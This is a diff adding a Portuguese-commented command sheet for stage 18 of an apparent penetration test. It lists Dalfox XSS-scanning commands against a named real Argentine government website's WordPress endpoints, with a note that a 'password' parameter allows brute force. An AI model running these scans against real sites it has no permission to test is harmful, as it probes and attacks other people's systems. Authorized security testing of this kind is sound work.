@@ -1,0 +1,82 @@
+# ============================================
+# ETAPA 18: CROSS-SITE SCRIPTING (XSS) TESTING
+# Comandos Dalfox (INSTALADO E FUNCIONANDO)
+# ============================================
+# Ferramenta: Dalfox v2.12.0
+# Localização: /c/Sec/Tools/dalfox.exe
+# Alvo: https://desarrolloyempleo.cba.gov.ar
+
+# ============================================
+# COMANDOS BÁSICOS (RECOMENDADOS)
+# ============================================
+
+# Comando 1: Testar URL específica com parâmetros (RECOMENDADO PARA INICIAR)
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test"
+
+# Comando 2: Testar endpoint WordPress REST API com parâmetro context
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=view"
+
+# Comando 3: Testar endpoint com parâmetro page_id
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/?page_id=1"
+
+# Comando 4: Testar endpoint oembed (já identificado com parâmetros)
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/oembed/1.0/embed?url=https://example.com&format=json"
+
+# ============================================
+# COMANDOS COM PIPE (USAR ARQUIVO DE URLs)
+# ============================================
+
+# Comando 5: Testar múltiplas URLs do paramspider (RECOMENDADO)
+cat paramspider_urls_with_params.txt | /c/Sec/Tools/dalfox.exe pipe
+
+# Comando 6: Testar URLs do arjun
+cat arjun_wpjson_posts.txt | /c/Sec/Tools/dalfox.exe pipe
+
+# ============================================
+# COMANDOS COM OPÇÕES AVANÇADAS
+# ============================================
+
+# Comando 7: Testar com múltiplas threads (mais rápido)
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test" --worker 20
+
+# Comando 8: Testar com output formatado (JSON)
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=view" --format json
+
+# Comando 9: Testar com output formatado (JUnit XML)
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test" --format junit
+
+# Comando 10: Testar com arquivo de URLs
+/c/Sec/Tools/dalfox.exe file paramspider_urls_with_params.txt
+
+# ============================================
+# COMANDOS COM OUTPUT EM ARQUIVO
+# ============================================
+
+# Comando 11: Testar e salvar output em arquivo (COM TEE - VER PROGRESSO)
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test" 2>&1 | tee etapa18_dalfox_password.txt
+
+# Comando 12: Testar com pipe e salvar output
+cat paramspider_urls_with_params.txt | /c/Sec/Tools/dalfox.exe pipe 2>&1 | tee etapa18_dalfox_paramspider.txt
+
+# Comando 13: Testar com arquivo e salvar output
+/c/Sec/Tools/dalfox.exe file paramspider_urls_with_params.txt 2>&1 | tee etapa18_dalfox_file.txt
+
+# Comando 14: Testar com múltiplas threads e salvar
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=view" --worker 20 2>&1 | tee etapa18_dalfox_context_worker.txt
+
+# ============================================
+# COMANDO RECOMENDADO PARA INICIAR:
+# ============================================
+/c/Sec/Tools/dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test" 2>&1 | tee etapa18_dalfox_password.txt
+
+# ============================================
+# NOTAS:
+# ============================================
+# - Dalfox v2.12.0 instalado e funcionando
+# - Use 'tee' para ver progresso no terminal E salvar no arquivo
+# - Dalfox é mais rápido que XSStrike
+# - Dalfox tem melhor suporte para pipe/arquivos
+# - O parâmetro 'context' já foi identificado como funcional
+# - O parâmetro 'password' permite brute-force (DE-009)
+# - Testar especialmente parâmetros que retornam conteúdo HTML/JSON
+# ============================================
